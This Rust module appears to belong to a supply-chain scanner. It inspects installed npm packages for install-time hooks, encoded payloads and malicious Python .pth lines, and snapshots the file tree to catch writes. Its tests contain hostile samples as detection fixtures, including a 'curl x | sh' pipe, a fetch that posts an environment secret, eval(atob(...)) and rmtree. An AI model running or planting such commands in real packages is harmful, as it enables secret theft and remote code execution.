//! Looking at an installed-but-not-yet-run tree: which packages want to run
//! code at install time, what that code looks like, and what the tree
//! contains before and after it runs.

use crate::modules::watch_install::script_signals;
use std::collections::HashMap;
use std::path::{Path, PathBuf};

/// Lifecycle hooks npm runs on install, in order.
pub const INSTALL_HOOKS: &[&str] = &["preinstall", "install", "postinstall"];
/// An unbroken run of base64 / hex characters at least this long is an
/// embedded encoded payload; code, even minified, breaks runs with punctuation.
const BLOB_MIN: usize = 120;
/// Helper files larger than this are not read.
const MAX_HELPER_BYTES: u64 = 1024 * 1024;

/// An installed package directory.
#[derive(Debug, Clone)]
pub struct Installed {
    pub dir: PathBuf,
    pub name: String,
    pub version: String,
    pub manifest: serde_json::Value,
}

/// Every package under `node_modules`, nested copies included.
pub fn installed_packages(node_modules: &Path) -> Vec<Installed> {
    let mut out = Vec::new();
    walk_node_modules(node_modules, &mut out);
    out
}

fn walk_node_modules(dir: &Path, out: &mut Vec<Installed>) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    let mut dirs: Vec<PathBuf> = entries
        .flatten()
        .filter(|e| e.file_type().is_ok_and(|t| t.is_dir()))
        .map(|e| e.path())
        .collect();
    dirs.sort();
    for d in dirs {
        let name = d
            .file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_default();
        if name.starts_with('.') {
            continue; // .bin, .cache, .package-lock.json's siblings
        }
        if name.starts_with('@') {
            walk_node_modules(&d, out);
            continue;
        }
        if let Some(pkg) = read_package(&d) {
            out.push(pkg);
        }
        walk_node_modules(&d.join("node_modules"), out);
    }
}

pub(super) fn read_package(dir: &Path) -> Option<Installed> {
    let manifest: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(dir.join("package.json")).ok()?).ok()?;
    Some(Installed {
        dir: dir.to_path_buf(),
        name: manifest.get("name")?.as_str()?.to_string(),
        version: manifest
            .get("version")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string(),
        manifest,
    })
}

/// A package that runs code at install time, and what that code looks like.
#[derive(Debug, Clone)]
pub struct ScriptPackage {
    pub pkg: Installed,
    /// (hook, command) as npm will run them.
    pub hooks: Vec<(String, String)>,
    /// Suspicious patterns found in the commands and the files they run.
    pub signals: Vec<String>,
    /// Length of the longest encoded-looking blob, if any.
    pub blob: Option<usize>,
    /// Helper files the commands run, relative to the package.
    pub helpers: Vec<String>,
}

impl ScriptPackage {
    pub fn suspicious(&self) -> bool {
        !self.signals.is_empty() || self.blob.is_some()
    }

    pub fn evidence(&self) -> String {
        let mut parts: Vec<String> = Vec::new();
        if !self.signals.is_empty() {
            parts.push(self.signals.join(", "));
        }
        if let Some(len) = self.blob {
            parts.push(format!(
                "a {len}-character encoded blob (likely obfuscated)"
            ));
        }
        let hooks: Vec<String> = self
            .hooks
            .iter()
            .map(|(h, c)| format!("{h}: `{c}`"))
            .collect();
        let mut s = hooks.join("; ");
        if !parts.is_empty() {
            s.push_str(&format!(" — {}", parts.join("; ")));
        }
        if !self.helpers.is_empty() {
            s.push_str(&format!(" (incl. {})", self.helpers.join(", ")));
        }
        s
    }
}

/// Files a shell command runs from the package: `node install.js`,
/// `sh ./scripts/build.sh`, `./setup`, …
fn helper_files(command: &str) -> Vec<String> {
    command
        .split(|c: char| c.is_whitespace() || matches!(c, ';' | '&' | '|' | '(' | ')'))
        .map(|t| t.trim_matches(|c| c == '"' || c == '\''))
        .filter(|t| {
            !t.is_empty()
                && !t.starts_with('-')
                && (t.starts_with("./")
                    || [".js", ".cjs", ".mjs", ".sh", ".py"]
                        .iter()
                        .any(|e| t.ends_with(e)))
        })
        .map(str::to_string)
        .collect()
}

/// Read `rel` from inside `dir` only — a script path cannot reach out.
fn read_inside(dir: &Path, rel: &str) -> Option<String> {
    let base = dir.canonicalize().ok()?;
    let path = base.join(rel).canonicalize().ok()?;
    if !path.starts_with(&base) || std::fs::metadata(&path).ok()?.len() > MAX_HELPER_BYTES {
        return None;
    }
    std::fs::read_to_string(path).ok()
}

/// Packages that will run code on install: lifecycle hooks, or a
/// `binding.gyp` with no `install` hook (npm then runs `node-gyp rebuild`).
pub fn script_packages(installed: &[Installed]) -> Vec<ScriptPackage> {
    let mut out = Vec::new();
    for pkg in installed {
        let scripts = pkg.manifest.get("scripts").and_then(|s| s.as_object());
        let mut hooks: Vec<(String, String)> = INSTALL_HOOKS
            .iter()
            .filter_map(|h| {
                let cmd = scripts?.get(*h)?.as_str()?;
                Some((h.to_string(), cmd.to_string()))
            })
            .collect();
        let gyp = pkg.dir.join("binding.gyp").is_file();
        if gyp
            && !hooks
                .iter()
                .any(|(h, _)| h == "install" || h == "preinstall")
        {
            hooks.push(("install".into(), "node-gyp rebuild".into()));
        }
        if hooks.is_empty() {
            continue;
        }
        let mut text = String::new();
        let mut helpers = Vec::new();
        for (_, cmd) in &hooks {
            text.push_str(cmd);
            text.push('\n');
            for h in helper_files(cmd) {
                if let Some(body) = read_inside(&pkg.dir, &h) {
                    text.push_str(&body);
                    text.push('\n');
                    helpers.push(h);
                }
            }
        }
        let mut signals = script_signals(&text);
        // A dependency's install code has no business outside its own
        // directory; `../` is how it would get there.
        if text.contains("../") || text.contains("..\\") {
            signals.push("reaches outside its package (../)".into());
        }
        out.push(ScriptPackage {
            pkg: pkg.clone(),
            hooks,
            signals,
            blob: encoded_blob(&text),
            helpers,
        });
    }
    out
}

/// Why the executable lines of a `.pth` file look malicious; empty when
/// they do not. `.pth` lines run at every Python start, so on top of the
/// usual Python signals, writing or deleting files counts: nothing
/// legitimate does that at interpreter start. Well-known benign shapes are
/// recognised first, since several use `__import__` or `os.environ`:
/// setuptools' distutils shim, editable-install finders, virtualenv's
/// bootstrap and namespace-package stubs.
pub fn pth_signals(code: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for line in code.lines() {
        let l = line.trim();
        let benign = l.starts_with("import __editable__")
            || l.starts_with("import _virtualenv")
            || (l.contains("'_distutils_hack'")
                && l.contains("add_shim()")
                && !l.contains("exec("))
            || (l.contains("f_locals['sitedir']")
                && l.contains("importlib")
                && !l.contains("exec("));
        if benign {
            continue;
        }
        out.extend(crate::modules::pip_audit::scan_python_signals(l));
        let writes = l.contains(".write(")
            || ["'w'", "\"w\"", "'a'", "\"a\"", "'wb'", "\"wb\""]
                .iter()
                .any(|m| l.contains("open(") && l.contains(m))
            || [
                "os.remove(",
                "os.unlink(",
                "shutil.",
                "os.rename(",
                "os.chmod(",
            ]
            .iter()
            .any(|m| l.contains(m));
        if writes {
            out.push("writes files at Python start".into());
        }
        if encoded_blob(l).is_some() {
            out.push("encoded payload".into());
        }
    }
    out.sort();
    out.dedup();
    out
}

/// The length of the longest run of base64/hex characters that mixes
/// letters and digits and is at least [`BLOB_MIN`] long.
pub fn encoded_blob(text: &str) -> Option<usize> {
    let mut best: Option<usize> = None;
    let mut consider = |run: &str| {
        let (mut digit, mut alpha) = (false, false);
        for c in run.chars() {
            digit |= c.is_ascii_digit();
            alpha |= c.is_ascii_alphabetic();
        }
        if run.len() >= BLOB_MIN && digit && alpha {
            best = Some(best.map_or(run.len(), |b| b.max(run.len())));
        }
    };
    let mut start = None;
    for (i, c) in text.char_indices() {
        let in_alphabet = c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '=' | '-' | '_');
        match (in_alphabet, start) {
            (true, None) => start = Some(i),
            (false, Some(s)) => {
                consider(&text[s..i]);
                start = None;
            }
            _ => {}
        }
    }
    if let Some(s) = start {
        consider(&text[s..]);
    }
    best
}

// ── Snapshots ─────────────────────────────────────────────────────────────────

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Stat {
    pub size: u64,
    pub mtime_ns: i128,
    pub executable: bool,
}

pub type Snapshot = HashMap<PathBuf, Stat>;

/// Every file under `root`, skipping directories named in `skip` (e.g.
/// `.git`). Size, modification time and the executable bit are enough to
/// see a write; hashing every file of a large tree would not pay off.
pub fn snapshot(root: &Path, skip: &[&str]) -> Snapshot {
    let mut out = HashMap::new();
    let mut stack = vec![root.to_path_buf()];
    while let Some(dir) = stack.pop() {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for e in entries.flatten() {
            let path = e.path();
            let Ok(meta) = e.metadata() else { continue };
            if meta.is_dir() {
                let name = e.file_name();
                if !skip.iter().any(|s| name == *s) {
                    stack.push(path);
                }
            } else if meta.is_file() {
                out.insert(path, stat(&meta));
            }
        }
    }
    out
}

fn stat(meta: &std::fs::Metadata) -> Stat {
    let mtime_ns = meta
        .modified()
        .ok()
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map_or(0, |d| d.as_nanos() as i128);
    #[cfg(unix)]
    let executable = {
        use std::os::unix::fs::PermissionsExt;
        meta.permissions().mode() & 0o111 != 0
    };
    #[cfg(not(unix))]
    let executable = false;
    Stat {
        size: meta.len(),
        mtime_ns,
        executable,
    }
}

#[derive(Debug, Default)]
pub struct Changes {
    pub created: Vec<PathBuf>,
    pub modified: Vec<PathBuf>,
    pub deleted: Vec<PathBuf>,
}

pub fn changes(before: &Snapshot, after: &Snapshot) -> Changes {
    let mut c = Changes::default();
    for (p, s) in after {
        match before.get(p) {
            None => c.created.push(p.clone()),
            Some(b) if b != s => c.modified.push(p.clone()),
            _ => {}
        }
    }
    c.deleted = before
        .keys()
        .filter(|p| !after.contains_key(*p))
        .cloned()
        .collect();
    c.created.sort();
    c.modified.sort();
    c.deleted.sort();
    c
}

// ── Transient files (unisolated runs) ─────────────────────────────────────────

/// Watches a tree while a script runs, to catch files created and deleted
/// before an after-snapshot could see them (the dropper pattern).
pub struct Watch {
    _watcher: notify::RecommendedWatcher,
    created: std::sync::mpsc::Receiver<notify::Result<notify::Event>>,
}

impl Watch {
    /// `None` if the platform watcher could not be started (e.g. inotify
    /// limits) — the caller reports monitoring as incomplete.
    pub fn start(roots: &[&Path]) -> Option<Watch> {
        use notify::Watcher;
        let (tx, rx) = std::sync::mpsc::channel();
        let mut w = notify::recommended_watcher(tx).ok()?;
        for r in roots {
            w.watch(r, notify::RecursiveMode::Recursive).ok()?;
        }
        Some(Watch {
            _watcher: w,
            created: rx,
        })
    }

    /// Files created during the watch that no longer exist. `Err` when the
    /// event queue overflowed, so the answer is not complete.
    pub fn vanished(self) -> Result<Vec<PathBuf>, String> {
        let mut seen: Vec<PathBuf> = Vec::new();
        for ev in self.created.try_iter() {
            let ev = ev.map_err(|e| e.to_string())?;
            if ev.need_rescan() {
                return Err("filesystem event queue overflowed".into());
            }
            if matches!(ev.kind, notify::EventKind::Create(_)) {
                seen.extend(ev.paths);
            }
        }
        seen.sort();
        seen.dedup();
        Ok(seen.into_iter().filter(|p| !p.exists()).collect())
    }
}

#[cfg(test)]
mod tests {

    #[test]
    fn pth_startup_code() {
        // Benign shapes from real wheels.
        for benign in [
            "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); ",
            "import __editable___mypkg_1_0_finder; __editable___mypkg_1_0_finder.install()",
            "import _virtualenv",
            "import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google',));importlib = has_mfs and __import__('importlib.util')",
        ] {
            assert!(pth_signals(benign).is_empty(), "{benign}");
        }
        for bad in [
            "import os; open(os.path.expanduser('~/x'), 'w').write('x')",
            "import os; os.system('curl x | sh')",
            "import urllib.request; urllib.request.urlopen('http://x')",
            "import shutil; shutil.rmtree('/tmp/x')",
        ] {
            assert!(!pth_signals(bad).is_empty(), "{bad}");
        }
    }

    use super::*;

    #[test]
    fn helper_files_are_taken_from_commands() {
        assert_eq!(helper_files("node install.js"), ["install.js"]);
        assert_eq!(
            helper_files("sh ./scripts/build.sh && node-gyp rebuild"),
            ["./scripts/build.sh"]
        );
        assert_eq!(
            helper_files("node -e \"require('x')\""),
            Vec::<String>::new()
        );
        assert_eq!(helper_files("./setup --fast"), ["./setup"]);
    }

    #[test]
    fn helpers_cannot_be_read_from_outside_the_package() {
        let dir = tempfile::tempdir().unwrap();
        let pkg = dir.path().join("pkg");
        std::fs::create_dir(&pkg).unwrap();
        std::fs::write(dir.path().join("secret.js"), "x").unwrap();
        std::fs::write(pkg.join("ok.js"), "y").unwrap();
        assert_eq!(read_inside(&pkg, "ok.js").as_deref(), Some("y"));
        assert_eq!(read_inside(&pkg, "../secret.js"), None);
    }

    #[test]
    fn walker_finds_nested_and_scoped_packages_and_script_packages() {
        let dir = tempfile::tempdir().unwrap();
        let nm = dir.path().join("node_modules");
        let write = |rel: &str, json: &str| {
            let d = nm.join(rel);
            std::fs::create_dir_all(&d).unwrap();
            std::fs::write(d.join("package.json"), json).unwrap();
        };
        write(
            "a",
            r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"node install.js"}}"#,
        );
        std::fs::write(
            nm.join("a/install.js"),
            "fetch('https://x', {body: process.env.T})",
        )
        .unwrap();
        write("a/node_modules/b", r#"{"name":"b","version":"2.0.0"}"#);
        write("@s/c", r#"{"name":"@s/c","version":"3.0.0"}"#);
        std::fs::write(nm.join("@s/c/binding.gyp"), "{}").unwrap();
        let installed = installed_packages(&nm);
        let mut ids: Vec<String> = installed
            .iter()
            .map(|p| format!("{}@{}", p.name, p.version))
            .collect();
        ids.sort();
        assert_eq!(ids, ["@s/c@3.0.0", "a@1.0.0", "b@2.0.0"]);

        let scripts = script_packages(&installed);
        let a = scripts.iter().find(|s| s.pkg.name == "a").unwrap();
        assert!(a.suspicious(), "helper file content is inspected");
        assert_eq!(a.helpers, ["install.js"]);
        let c = scripts.iter().find(|s| s.pkg.name == "@s/c").unwrap();
        assert_eq!(
            c.hooks,
            [("install".to_string(), "node-gyp rebuild".to_string())]
        );
        assert!(!c.suspicious());
    }

    #[test]
    fn encoded_blobs_but_not_code() {
        let blob = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIGxvbmcgYmFzZTY0IHBheWxvYWQgdGhhdCBjYXJyaWVzIGEgaGlkZGVuIHNjcmlwdCB0byBydW4gb24gaW5zdGFsbA==";
        assert_eq!(
            encoded_blob(&format!("eval(atob('{blob}'))")),
            Some(blob.len())
        );
        let code = "const result = await fetchBinary(platform, arch); if (!result.ok) { throw new Error(`failed ${result.status}`) }";
        assert_eq!(encoded_blob(&code.repeat(20)), None);
        // A long sha512 integrity string in a lockfile-like line is a blob,
        // but a long word list without digits is not.
        assert_eq!(encoded_blob(&"abcdefghij".repeat(20)), None);
    }

    #[test]
    fn snapshot_changes() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("keep"), "1").unwrap();
        std::fs::write(dir.path().join("gone"), "1").unwrap();
        let before = snapshot(dir.path(), &[]);
        std::fs::remove_file(dir.path().join("gone")).unwrap();
        std::fs::write(dir.path().join("new"), "1").unwrap();
        std::fs::write(dir.path().join("keep"), "22").unwrap();
        let c = changes(&before, &snapshot(dir.path(), &[]));
        assert_eq!(c.created, [dir.path().join("new")]);
        assert_eq!(c.modified, [dir.path().join("keep")]);
        assert_eq!(c.deleted, [dir.path().join("gone")]);
    }
}
